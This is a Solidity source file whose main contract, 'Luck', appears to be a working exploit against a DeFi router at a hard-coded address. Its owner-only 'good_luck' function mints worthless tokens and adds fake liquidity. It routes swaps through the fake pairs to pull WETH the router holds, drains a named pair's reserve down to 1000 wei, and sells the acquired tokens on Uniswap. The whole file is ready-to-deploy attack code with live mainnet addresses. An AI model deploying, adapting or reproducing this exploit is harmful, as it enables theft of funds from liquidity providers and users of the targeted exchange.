pragma solidity ^0.8.0;

uint256 constant MAX_UINT256 = 2**256 - 1;

contract Token {
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    uint256 public totalSupply;
    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name;                   //fancy name: eg Simon Bucks
    uint8 public decimals;                //How many decimals to show.
    string public symbol;                 //An identifier: eg SBX

    constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string  memory _tokenSymbol) {
        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens
        totalSupply = _initialAmount;                        // Update total supply
        name = _tokenName;                                   // Set the name for display purposes
        decimals = _decimalUnits;                            // Amount of decimals for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value, "token balance is lower than the value requested");
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value, "token balance or allowance is lower than amount requested");
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}


interface IUniswapV2Router01 {
  function addLiquidity(
      address tokenA,
      address tokenB,
      uint amountADesired,
      uint amountBDesired,
      uint amountAMin,
      uint amountBMin,
      address to,
      uint deadline
  ) external returns (uint amountA, uint amountB, uint liquidity);
  function addLiquidityETH(
      address token,
      uint amountTokenDesired,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
  ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  function removeLiquidity(
      address tokenA,
      address tokenB,
      uint liquidity,
      uint amountAMin,
      uint amountBMin,
      address to,
      uint deadline
  ) external returns (uint amountA, uint amountB);
  function removeLiquidityETH(
      address token,
      uint liquidity,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
  ) external returns (uint amountToken, uint amountETH);
  
  function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
      external
      payable
      returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getTokenInPair(address pair,address token) 
        external
        view
    returns (uint balance);
}

interface IFactory {
    function getPair(address, address) external returns(address);
}

interface IERC20 {
    function balanceOf(address) external returns(uint256);

    function approve(address _spender, uint256 _value) external returns (bool success);
}

contract Luck {
    address private owner;
    IUniswapV2Router02 private router = IUniswapV2Router02(0xe4FE6a45f354E845F954CdDeE6084603CEDB9410);
    IUniswapV2Router02 private uni_router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    Token public token0;
    Token public token1;
    Token public token2;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
        token0 = new Token(MAX_UINT256, "token0", 18, "A");
        token1 = new Token(MAX_UINT256, "token1", 18, "B");
        token2 = new Token(MAX_UINT256, "token2", 18, "C");
        token0.approve(address(router), MAX_UINT256);
        token1.approve(address(router), MAX_UINT256);
        token2.approve(address(router), MAX_UINT256);
    }

    function good_luck(address[] calldata tokens) external payable onlyOwner {
        IFactory factory = IFactory(0xF028F723ED1D0fE01cC59973C49298AA95c57472);
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            address pair = factory.getPair(WETH, token);
            uint token_amt = router.getTokenInPair(pair, token);

            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = token;

            router.swapETHForExactTokens{value: address(this).balance}(token_amt /2, path, address(this), block.timestamp);
        }
        uint weth_amt = IERC20(WETH).balanceOf(address(router));

        (,,uint lp0) = router.addLiquidityETH{value: weth_amt}(address(token0), 10000, 0, 0, address(this), block.timestamp);
        (,,uint lp1) = router.addLiquidity(address(token1), address(token2), 1e18, 1e18, 0, 0, address(this), block.timestamp);
        (,,uint lp2) = router.addLiquidityETH{value: weth_amt}(address(token1), 10000, 0, 0, address(this), block.timestamp);
        (,,uint lp3) = router.addLiquidityETH{value: 10000}(address(token2), 10000, 0, 0, address(this), block.timestamp);
        
        address[] memory path = new address[](5);
        path[0] = address(token0);
        path[1] = WETH;
        path[2] = address(token1);
        path[3] = address(token2);
        path[4] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(1e30, 0, path, address(this), block.timestamp);
        
        address[] memory path1 = new address[](2);
        path1[0] = address(token1);
        path1[1] = WETH;
        router.swapTokensForExactETH(router.getTokenInPair(0x7fE7F418675eAa761317456551d6980D03CDe543, WETH)-1000, MAX_UINT256, path1, address(this), block.timestamp);

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            IERC20(token).approve(address(uni_router), MAX_UINT256);
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = WETH;
            uint token_amt = IERC20(token).balanceOf(address(this));

            uni_router.swapExactTokensForETH(token_amt, 0, path, address(this), block.timestamp);
        }
   }

    receive() external payable {}
}